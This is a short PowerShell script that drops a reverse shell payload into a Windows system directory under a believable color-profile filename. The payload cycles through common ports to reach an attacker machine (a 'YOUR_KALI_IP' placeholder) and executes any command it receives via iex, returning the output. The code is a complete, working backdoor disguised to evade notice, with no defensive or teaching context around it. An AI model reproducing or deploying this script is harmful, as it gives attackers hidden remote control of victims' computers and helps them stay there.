# Create the disguised directory if it doesn't exist
$dir = "C:\Windows\System32\spool\drivers\color"

# Write the full reverse shell payload to a believable filename
$payload = @'
$ports = @(80, 443, 8080, 3306, 4444, 5985, 8443)
$ip = "YOUR_KALI_IP"

while ($true) {
    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535 | % { 0 }
            while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
                $sendback = (iex $data 2>&1 | Out-String)
                $sendback2 = $sendback + "PS " + (pwd).Path + "> "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
            }
            $client.Close()
        } catch {
            Start-Sleep -Seconds 5
        }
    }
    Start-Sleep -Seconds 15
}
'@

$payload | Out-File -FilePath "$dir\ColorProfile_svc.ps1" -Encoding ASCII
Write-Host "[+] Payload written. Verifying..."
Get-Content "$dir\ColorProfile_svc.ps1"
